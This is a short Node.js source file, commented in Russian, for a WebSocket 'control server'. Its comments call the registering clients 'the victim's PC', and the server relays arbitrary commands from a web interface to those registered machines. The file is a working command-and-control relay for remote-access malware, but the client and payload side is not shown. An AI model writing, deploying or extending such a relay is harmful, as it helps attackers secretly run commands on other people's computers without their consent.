const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Хранилище подключённых клиентов: roomCode -> ws
const clients = new Map();

wss.on('connection', (ws) => {
  console.log('Новое подключение');

  ws.on('message', (message) => {
    const data = JSON.parse(message);
    const { type, room, command } = data;

    if (type === 'register') {
      // Клиент (ПК жертвы) регистрируется в комнате
      ws.room = room;
      clients.set(room, ws);
      console.log(`Клиент зарегистрирован в комнате ${room}`);
      ws.send(JSON.stringify({ status: 'registered' }));
    } 
    else if (type === 'command') {
      // Веб-интерфейс отправляет команду для конкретной комнаты
      const targetWs = clients.get(room);
      if (targetWs && targetWs.readyState === WebSocket.OPEN) {
        targetWs.send(JSON.stringify({ command }));
        console.log(`Команда "${command}" отправлена в комнату ${room}`);
      } else {
        ws.send(JSON.stringify({ error: 'Клиент не найден' }));
      }
    }
  });

  ws.on('close', () => {
    if (ws.room) {
      clients.delete(ws.room);
      console.log(`Клиент из комнаты ${ws.room} отключился`);
    }
  });
});

// Простой маршрут для проверки работы
app.get('/', (req, res) => {
  res.send('Сервер управления работает!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});
